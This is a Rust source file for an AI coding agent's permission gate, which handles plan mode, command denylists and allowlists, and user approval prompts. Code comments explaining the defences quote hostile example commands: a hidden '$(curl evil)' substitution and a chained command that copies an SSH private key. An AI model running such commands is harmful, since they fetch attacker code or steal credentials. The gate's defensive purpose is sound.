use std::sync::Arc;

use agent_core::domain::{AgentEvent, PermissionOption, PermissionOptionKind, PermissionRequest};
use agent_core::ids::{PermissionRequestId, SessionId, ToolCallId};
use async_channel::Sender;
use serde_json::Value;
use tokio::sync::Mutex;
use tokio_util::sync::CancellationToken;

use crate::loop_state::{Decision, Resolution, RunControl, SessionState};
use crate::mcp::is_mcp_tool;
use crate::safety::{classify_command, CommandRisk};
use crate::tools::{
    PermissionMode, PermissionScope, ToolCtx, ToolExecutor, ToolPermissionClass,
    ToolPermissionDecision,
};

#[derive(Clone)]
pub(crate) struct PermissionGate {
    session: Arc<Mutex<SessionState>>,
    control: Arc<Mutex<RunControl>>,
    /// Only permission acquisition is serialized. Once each request is
    /// approved, non-mutating tool bodies can still execute concurrently.
    permission_queue: Arc<Mutex<()>>,
    session_id: SessionId,
    events: Sender<AgentEvent>,
    execution: Option<crate::root_execution::RootExecutionTrace>,
}

pub(crate) enum PermissionOutcome {
    Allowed,
    Denied(String),
    Cancelled,
    Failed(String),
}

enum PermissionWaitOutcome {
    Resolved(Resolution),
    Cancelled,
    Failed(String),
}

struct PermissionAttempt<'a> {
    tool_id: &'a ToolCallId,
    tool_name: &'a str,
    executor: &'a dyn ToolExecutor,
    args: &'a Value,
    context: &'a ToolCtx,
    scope: Option<&'a PermissionScope>,
    info: &'a GateInfo,
    signal: &'a CancellationToken,
}

impl PermissionGate {
    pub fn new(
        session: Arc<Mutex<SessionState>>,
        control: Arc<Mutex<RunControl>>,
        session_id: SessionId,
        events: Sender<AgentEvent>,
    ) -> Self {
        Self {
            session,
            control,
            permission_queue: Arc::new(Mutex::new(())),
            session_id,
            events,
            execution: None,
        }
    }

    pub(crate) fn with_execution(
        mut self,
        execution: crate::root_execution::RootExecutionTrace,
    ) -> Self {
        self.execution = Some(execution);
        self
    }

    pub async fn check(
        &self,
        tool_id: &ToolCallId,
        tool_name: &str,
        exec: &dyn ToolExecutor,
        args: &Value,
        ctx: &ToolCtx,
        signal: &CancellationToken,
    ) -> PermissionOutcome {
        if !exec.permission_class().requires_gate() {
            if self.session.lock().await.planning.plan_mode() && exec.mutating_for_args(args) {
                return PermissionOutcome::Denied(
                    "Plan mode is active — read-only until your plan is approved. Research more, \
                    then emit a hidden proposed_plan block."
                        .to_string(),
                );
            }
            return PermissionOutcome::Allowed;
        }
        if let Err(reason) = exec.permission_preflight(args) {
            return PermissionOutcome::Denied(format!(
                "Refused: {reason}. The action was not run."
            ));
        }

        if self.session.lock().await.planning.plan_mode() {
            if tool_name == "enter_plan_mode" {
                return PermissionOutcome::Denied(
                    "Plan mode is already active — research and emit a hidden proposed_plan block when your \
                    plan is ready."
                        .to_string(),
                );
            }
            // Plan mode is a research phase, not a straitjacket: strictly
            // read-only shell (ls, git log, rg…) may still run. The hard floor
            // (Blocked classification + user denylist) is checked first so
            // plan mode never widens what a command could do.
            if tool_name == "bash" {
                let info = gate_info(tool_name, args);
                if let Some(why) = self.hard_refusal(tool_name, &info).await {
                    return PermissionOutcome::Denied(format!(
                        "Refused: {why}. The command was not run."
                    ));
                }
                if info.requires_elevation {
                    return PermissionOutcome::Denied(
                        "Plan mode is active — network and host access cannot be granted while \
                        the session is read-only. Finish the plan, then run the command after \
                        approval."
                            .to_string(),
                    );
                }
                if crate::safety::is_read_only_command(info.detail.as_deref().unwrap_or("")) {
                    return PermissionOutcome::Allowed;
                }
                return PermissionOutcome::Denied(
                    "Plan mode is active — only read-only commands can run right now, and \
                        this command could change something. Research with read-only tools, then emit a \
                    hidden proposed_plan block."
                        .to_string(),
                );
            }
            return PermissionOutcome::Denied(
                "Plan mode is active — read-only until your plan is approved. Research more, \
                then emit a hidden proposed_plan block."
                    .to_string(),
            );
        }

        let scope = exec.permission_scope(args);
        let mut info = gate_info(tool_name, args);
        if exec.permission_class() == ToolPermissionClass::External {
            info.external = true;
        }
        if let Some(reason) = scope
            .as_ref()
            .and_then(|scope| scope.reason.as_ref())
            .cloned()
        {
            info.reason = Some(reason);
        }
        if let Some(diff) = exec.preview(args, ctx) {
            info.detail = Some(diff);
        }

        if let Some(why) = self.hard_refusal(tool_name, &info).await {
            return PermissionOutcome::Denied(format!("Refused: {why}. The command was not run."));
        }

        if scope.as_ref().is_some_and(|scope| scope.preapproved) {
            return PermissionOutcome::Allowed;
        }

        if self.command_preapproved(tool_name, &info).await {
            return PermissionOutcome::Allowed;
        }

        // Entering Plan Mode must always get an explicit human answer. Plan
        // proposals themselves use the typed ProposedPlan contract instead.
        let is_plan_gate = tool_name == "enter_plan_mode";
        let is_one_off = scope.as_ref().is_some_and(|scope| !scope.remember);
        let mode = if is_plan_gate || is_one_off {
            PermissionMode::Ask
        } else {
            let s = self.session.lock().await;
            s.policy
                .get(policy_key(tool_name, scope.as_ref()))
                .copied()
                .unwrap_or(PermissionMode::Ask)
        };
        let (decision, _feedback) = match mode {
            PermissionMode::Allow => (Decision::AllowOnce, None),
            PermissionMode::Deny => (Decision::RejectOnce, None),
            PermissionMode::Ask => {
                match self
                    .ask_permission(PermissionAttempt {
                        tool_id,
                        tool_name,
                        executor: exec,
                        args,
                        context: ctx,
                        scope: scope.as_ref(),
                        info: &info,
                        signal,
                    })
                    .await
                {
                    PermissionWaitOutcome::Resolved(resolution) => {
                        (resolution.decision, resolution.feedback)
                    }
                    PermissionWaitOutcome::Cancelled => return PermissionOutcome::Cancelled,
                    PermissionWaitOutcome::Failed(message) => {
                        return PermissionOutcome::Failed(message)
                    }
                }
            }
        };
        if mode != PermissionMode::Ask {
            if let Err(message) = exec
                .permission_decision(args, tool_permission_decision(decision), ctx)
                .await
            {
                return PermissionOutcome::Failed(format!(
                    "permission authorization failed for `{tool_name}`: {message}"
                ));
            }
        }
        let approved = decision.approved();

        if tool_name == "enter_plan_mode" && approved {
            let mut s = self.session.lock().await;
            s.planning
                .set_mode(agent_core::provider::CollaborationMode::Plan);
        }

        if approved {
            PermissionOutcome::Allowed
        } else if tool_name == "enter_plan_mode" {
            PermissionOutcome::Denied(
                "The user wants you to proceed directly — skip the planning phase and build \
                it, asking questions as needed."
                    .to_string(),
            )
        } else {
            PermissionOutcome::Denied(format!("The user denied permission to run `{tool_name}`."))
        }
    }

    /// Whether Plan Mode is currently active for this session.
    async fn ask_permission(&self, attempt: PermissionAttempt<'_>) -> PermissionWaitOutcome {
        let PermissionAttempt {
            tool_id,
            tool_name,
            executor,
            args,
            context,
            scope,
            info,
            signal,
        } = attempt;
        // agent-loop runs non-mutating tools in parallel, but the desktop UI
        // intentionally presents one permission decision at a time. Queue only
        // this acquisition phase; the guard is released before the tool body
        // runs, preserving parallel fetch/read execution after authorization.
        let _permission_turn = tokio::select! {
            biased;
            _ = signal.cancelled() => return PermissionWaitOutcome::Cancelled,
            guard = self.permission_queue.lock() => guard,
        };
        if signal.is_cancelled() {
            return PermissionWaitOutcome::Cancelled;
        }

        // A prior request in this same parallel batch may have changed the
        // session policy while this one waited its turn. Honor that decision
        // instead of surfacing a redundant prompt or running against stale
        // authorization state.
        let is_plan_gate = tool_name == "enter_plan_mode";
        let is_one_off = scope.is_some_and(|scope| !scope.remember);
        if !is_plan_gate && !is_one_off {
            if self.command_preapproved(tool_name, info).await {
                return PermissionWaitOutcome::Resolved(Decision::AllowOnce.into());
            }
            match self
                .session
                .lock()
                .await
                .policy
                .get(policy_key(tool_name, scope))
                .copied()
                .unwrap_or(PermissionMode::Ask)
            {
                PermissionMode::Allow => {
                    return PermissionWaitOutcome::Resolved(Decision::AllowOnce.into())
                }
                PermissionMode::Deny => {
                    return PermissionWaitOutcome::Resolved(Decision::RejectOnce.into())
                }
                PermissionMode::Ask => {}
            }
        }

        if let Some(execution) = &self.execution {
            execution.transition(
                agent_orchestration::ExecutionState::AwaitingInput,
                Some(format!("permission requested for {tool_name}")),
            );
        }
        let request_id = PermissionRequestId::new(format!("perm-{}", tool_id.as_str()));
        let (responder, rx) = tokio::sync::oneshot::channel();
        {
            let mut control = self.control.lock().await;
            if let Err(existing) = control.arm(request_id.clone(), responder) {
                return PermissionWaitOutcome::Failed(format!(
                    "permission coordination error: request `{}` was still pending when `{}` tried to start",
                    existing.as_str(),
                    request_id.as_str()
                ));
            }
        }

        if self
            .events
            .send(AgentEvent::PermissionRequest {
                request: PermissionRequest {
                    id: request_id.clone(),
                    session: self.session_id.clone(),
                    tool_call: Some(tool_id.clone()),
                    title: permission_title(tool_name, scope, info),
                    options: permission_options(tool_name, scope, info),
                    detail: info.detail.clone(),
                    risk: if let Some(risk) = scope.and_then(|scope| scope.risk.as_ref()).cloned() {
                        Some(risk)
                    } else if tool_name == "enter_plan_mode" {
                        Some("plan_entry".to_string())
                    } else if tool_name == "generate_image" {
                        // Keep this distinct from generic external/MCP work so
                        // the UI can accurately name a billed generation while
                        // still requiring review in Auto mode.
                        Some("billed".to_string())
                    } else if info.external {
                        Some("external".to_string())
                    } else if matches!(info.risk, Some(CommandRisk::Danger)) {
                        Some("danger".to_string())
                    } else if info.network {
                        Some("network".to_string())
                    } else if info.requires_elevation {
                        Some("sandbox".to_string())
                    } else {
                        info.risk.map(|r| r.as_str().to_string())
                    },
                    reason: info.reason.clone(),
                },
            })
            .await
            .is_err()
        {
            self.control.lock().await.clear_if(&request_id);
            return PermissionWaitOutcome::Failed(format!(
                "permission coordination error: request `{}` could not be delivered",
                request_id.as_str()
            ));
        }

        let outcome = tokio::select! {
            biased;
            _ = signal.cancelled() => PermissionWaitOutcome::Cancelled,
            result = rx => match result {
                Ok(resolution) => PermissionWaitOutcome::Resolved(resolution),
                Err(_) if signal.is_cancelled() => PermissionWaitOutcome::Cancelled,
                Err(_) => PermissionWaitOutcome::Failed(format!(
                    "permission coordination error: response channel for `{}` closed without a decision",
                    request_id.as_str()
                )),
            },
        };
        let resolved_decision = match &outcome {
            PermissionWaitOutcome::Resolved(resolution) => Some(resolution.decision),
            PermissionWaitOutcome::Cancelled | PermissionWaitOutcome::Failed(_) => None,
        };
        if let Some(decision) = resolved_decision {
            if let Err(message) = executor
                .permission_decision(args, tool_permission_decision(decision), context)
                .await
            {
                self.control.lock().await.clear_if(&request_id);
                return PermissionWaitOutcome::Failed(format!(
                    "permission authorization failed for `{tool_name}`: {message}"
                ));
            }
            // Apply "always" while this request still owns the queue. The next
            // parallel waiter then observes the updated policy before deciding
            // whether it needs to ask.
            if !is_plan_gate {
                self.apply_policy(tool_name, scope, info, decision).await;
            }
        }
        if let Some(execution) = &self.execution {
            execution.transition(
                agent_orchestration::ExecutionState::Running,
                Some("permission wait resolved".to_string()),
            );
        }
        if !matches!(outcome, PermissionWaitOutcome::Resolved(_)) {
            self.control.lock().await.clear_if(&request_id);
        }
        outcome
    }

    async fn hard_refusal(&self, name: &str, info: &GateInfo) -> Option<String> {
        if name == "bash" && matches!(info.risk, Some(CommandRisk::Blocked)) {
            return Some(
                info.reason
                    .clone()
                    .unwrap_or_else(|| "blocked for safety".to_string()),
            );
        }
        let s = self.session.lock().await;
        let detail = info.detail.as_deref().unwrap_or("");
        if let Some(reason) = crate::hard_constraints::refusal(name, detail, &s.hard_constraints) {
            return Some(reason);
        }
        if name != "bash" {
            return None;
        }
        let cmd = detail.to_string();
        let segments = crate::safety::split_segments(&cmd);
        s.deny_commands
            .iter()
            .any(|denied| {
                prefix_match(&cmd, denied)
                    || segments.iter().any(|segment| prefix_match(segment, denied))
            })
            .then(|| "on your command denylist".to_string())
    }

    async fn command_preapproved(&self, name: &str, info: &GateInfo) -> bool {
        if name != "bash"
            || info.network
            || info.requires_elevation
            || !matches!(
                info.risk,
                Some(CommandRisk::Safe) | Some(CommandRisk::Caution)
            )
        {
            return false;
        }
        let cmd = info.detail.clone().unwrap_or_default();
        // Never preapprove command substitution: it can't be split into segments,
        // so an allowlisted prefix (`cargo test`) would otherwise carry a hidden
        // `$(curl evil)` / backtick payload straight past the gate.
        if cmd.contains("$(") || cmd.contains('`') {
            return false;
        }
        // Match the allowlist PER SEGMENT, not against the whole raw line: an
        // "always allow `cargo test`" grant must not silently run
        // `cargo test && cp ~/.ssh/id_rsa /tmp` just because the line starts with
        // the trusted prefix. Every segment must be individually trusted — either
        // allowlisted by prefix, or inherently Safe (so `cargo test | tee log`
        // still preapproves).
        let segments = crate::safety::split_segments(&cmd);
        if segments.is_empty() {
            return false;
        }
        let s = self.session.lock().await;
        let mut matched_explicit_rule = false;
        for segment in segments {
            if s.allow_commands
                .iter()
                .any(|allowed| prefix_match(segment, allowed))
            {
                matched_explicit_rule = true;
            } else if classify_command(segment).risk != CommandRisk::Safe {
                return false;
            }
        }
        // Safe commands are auto-resolved by Auto mode in the UI. They must
        // still reach the permission request in Ask mode unless the user has
        // explicitly remembered a matching command rule.
        matched_explicit_rule
    }

    async fn apply_policy(
        &self,
        tool: &str,
        scope: Option<&PermissionScope>,
        info: &GateInfo,
        decision: Decision,
    ) {
        if scope.is_some_and(|scope| !scope.remember)
            && matches!(decision, Decision::AllowAlways | Decision::RejectAlways)
        {
            return;
        }
        let key = policy_key(tool, scope).to_string();
        let mut s = self.session.lock().await;
        match decision {
            Decision::AllowAlways => {
                if tool == "bash" {
                    // Remembered command text is scoped to sandboxed, offline
                    // execution. Network or host access must be approved for
                    // each request because those capabilities are not part of
                    // the original command-string grant.
                    if info.network || info.requires_elevation {
                        return;
                    }
                    if let Some(cmd) = info.detail.as_deref() {
                        let entry = cmd.trim().to_string();
                        if !entry.is_empty() && !s.allow_commands.contains(&entry) {
                            s.allow_commands.push(entry);
                        }
                    }
                } else {
                    s.policy.insert(key, PermissionMode::Allow);
                }
            }
            Decision::RejectAlways => {
                s.policy.insert(key, PermissionMode::Deny);
            }
            _ => {}
        }
    }
}

fn tool_permission_decision(decision: Decision) -> ToolPermissionDecision {
    match decision {
        Decision::AllowOnce => ToolPermissionDecision::AllowOnce,
        Decision::AllowAlways => ToolPermissionDecision::AllowAlways,
        Decision::RejectOnce | Decision::RejectAlways => ToolPermissionDecision::Denied,
    }
}

struct GateInfo {
    detail: Option<String>,
    risk: Option<CommandRisk>,
    reason: Option<String>,
    external: bool,
    network: bool,
    requires_elevation: bool,
}

fn gate_info(name: &str, args: &Value) -> GateInfo {
    if is_mcp_tool(name) {
        let pretty = serde_json::to_string_pretty(args).unwrap_or_else(|_| args.to_string());
        return GateInfo {
            detail: Some(pretty),
            risk: None,
            reason: Some("connected service action - review its inputs".to_string()),
            external: true,
            network: false,
            requires_elevation: false,
        };
    }
    match name {
        "web_fetch" => GateInfo {
            detail: args.get("url").and_then(Value::as_str).map(str::to_string),
            risk: None,
            reason: Some("accesses an external site directly from this device".to_string()),
            external: true,
            network: false,
            requires_elevation: false,
        },
        "bash" => {
            let cmd = args
                .get("command")
                .and_then(Value::as_str)
                .unwrap_or("")
                .trim()
                .to_string();
            let c = classify_command(&cmd);
            let network = crate::safety::command_requires_network(&cmd);
            let explicitly_requested = args
                .get("sandbox_permissions")
                .and_then(Value::as_str)
                .is_some_and(|value| value == "require_escalated");
            let justification = args
                .get("justification")
                .and_then(Value::as_str)
                .map(str::trim)
                .filter(|value| !value.is_empty())
                .map(str::to_string);
            let requires_elevation =
                explicitly_requested || crate::safety::command_requires_host(&cmd);
            GateInfo {
                detail: Some(cmd),
                risk: Some(c.risk),
                reason: justification.or(c.reason).or_else(|| {
                    requires_elevation
                        .then(|| "requires access outside the project sandbox".to_string())
                }),
                external: false,
                network,
                requires_elevation,
            }
        }
        "write_file" | "edit_file" => GateInfo {
            detail: args.get("path").and_then(Value::as_str).map(str::to_string),
            risk: None,
            reason: None,
            external: false,
            network: false,
            requires_elevation: false,
        },
        "enter_plan_mode" => GateInfo {
            detail: args
                .get("reason")
                .and_then(Value::as_str)
                .map(str::to_string),
            risk: None,
            reason: None,
            external: false,
            network: false,
            requires_elevation: false,
        },
        // Image generation writes an output file and calls Clark Code's billed
        // platform relay. Keep it outside automatic approval and show the
        // visual intent without serializing large reference-image payloads.
        "generate_image" => {
            let prompt = args
                .get("prompt")
                .and_then(Value::as_str)
                .unwrap_or("(no prompt provided)");
            let mut prompt_preview = prompt.chars().take(300).collect::<String>();
            if prompt.chars().nth(300).is_some() {
                prompt_preview.push('…');
            }
            let output = args
                .get("output_path")
                .and_then(Value::as_str)
                .unwrap_or("images/<prompt>.<returned-format>");
            GateInfo {
                detail: Some(format!(
                    "Generate image through Clark Code (may consume credits)\nPrompt: {prompt_preview}\nSave to: {output} (extension matches returned image)"
                )),
                risk: None,
                reason: Some(
                    "uses a billed Clark Code image-generation call; review the visual intent"
                        .to_string(),
                ),
                external: true,
                network: false,
                requires_elevation: false,
            }
        }
        // MCP-tool posture, not a brokered product tool's zero-gate one: it drives a
        // real browser against live sites under arbitrary session state, a
        // much larger blast radius than a bounded server-side call — `external:
        // true` keeps it out of "auto" mode's default-safe auto-approval.
        "browser" => {
            let pretty = serde_json::to_string_pretty(args).unwrap_or_else(|_| args.to_string());
            GateInfo {
                detail: Some(pretty),
                risk: None,
                reason: Some("experimental browser tool - review its action".to_string()),
                external: true,
                network: false,
                requires_elevation: false,
            }
        }
        _ => GateInfo {
            detail: None,
            risk: None,
            reason: None,
            external: false,
            network: false,
            requires_elevation: false,
        },
    }
}

fn prefix_match(cmd: &str, entry: &str) -> bool {
    let cmd = cmd.trim();
    let entry = entry.trim();
    !entry.is_empty() && (cmd == entry || cmd.starts_with(&format!("{entry} ")))
}

fn policy_key<'a>(tool: &'a str, scope: Option<&'a PermissionScope>) -> &'a str {
    scope.map(|scope| scope.key.as_str()).unwrap_or(tool)
}

fn permission_title(tool: &str, scope: Option<&PermissionScope>, info: &GateInfo) -> String {
    if let Some(title) = scope.and_then(|scope| scope.title.clone()) {
        return title;
    }
    match tool {
        "bash" if info.network => "Allow this command to use the network?".to_string(),
        "bash" if info.requires_elevation => {
            "Run this command outside the project sandbox?".to_string()
        }
        "bash" => "Run a shell command?".to_string(),
        "edit_file" => "Apply this edit?".to_string(),
        "write_file" => "Write this file?".to_string(),
        "enter_plan_mode" => "Start with a plan?".to_string(),
        "generate_image" => "Generate an image?".to_string(),
        "browser" => "Run this browser action?".to_string(),
        "web_fetch" => "Access this external site?".to_string(),
        t if is_mcp_tool(t) => "Run this connected action?".to_string(),
        _ => "Allow this action to run?".to_string(),
    }
}

fn permission_options(
    tool: &str,
    scope: Option<&PermissionScope>,
    info: &GateInfo,
) -> Vec<PermissionOption> {
    if tool == "enter_plan_mode" {
        return vec![
            PermissionOption {
                id: "allow_once".into(),
                label: "Yes, plan first".into(),
                kind: PermissionOptionKind::AllowOnce,
            },
            PermissionOption {
                id: "reject_once".into(),
                label: "No, just build".into(),
                kind: PermissionOptionKind::RejectOnce,
            },
        ];
    }
    if scope.is_some_and(|scope| !scope.remember) {
        return vec![
            PermissionOption {
                id: "allow_once".into(),
                label: "Allow once".into(),
                kind: PermissionOptionKind::AllowOnce,
            },
            PermissionOption {
                id: "reject_once".into(),
                label: "Reject".into(),
                kind: PermissionOptionKind::RejectOnce,
            },
        ];
    }
    if tool == "bash" && (info.network || info.requires_elevation) {
        return vec![
            PermissionOption {
                id: "allow_once".into(),
                label: "Allow once".into(),
                kind: PermissionOptionKind::AllowOnce,
            },
            PermissionOption {
                id: "reject_once".into(),
                label: "Reject".into(),
                kind: PermissionOptionKind::RejectOnce,
            },
        ];
    }
    let always = if tool == "bash" {
        "Always allow this command".to_string()
    } else if is_mcp_tool(tool) {
        "Always allow connected actions".to_string()
    } else {
        scope
            .and_then(|scope| scope.always_label.clone())
            .unwrap_or_else(|| "Always allow similar actions".to_string())
    };
    vec![
        PermissionOption {
            id: "allow_once".into(),
            label: "Allow once".into(),
            kind: PermissionOptionKind::AllowOnce,
        },
        PermissionOption {
            id: "allow_always".into(),
            label: always,
            kind: PermissionOptionKind::AllowAlways,
        },
        PermissionOption {
            id: "reject_once".into(),
            label: "Reject".into(),
            kind: PermissionOptionKind::RejectOnce,
        },
    ]
}

#[cfg(test)]
#[path = "permissions_tests.rs"]
mod tests;
